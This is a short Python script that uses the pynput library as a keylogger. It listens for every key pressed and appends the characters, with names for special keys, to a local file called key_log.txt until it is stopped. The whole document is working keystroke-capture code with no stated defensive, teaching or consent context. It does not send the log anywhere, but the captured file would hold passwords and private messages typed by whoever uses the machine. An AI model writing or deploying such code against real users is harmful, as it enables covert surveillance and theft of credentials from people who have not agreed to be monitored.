from pynput import keyboard

# File to store the logs
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()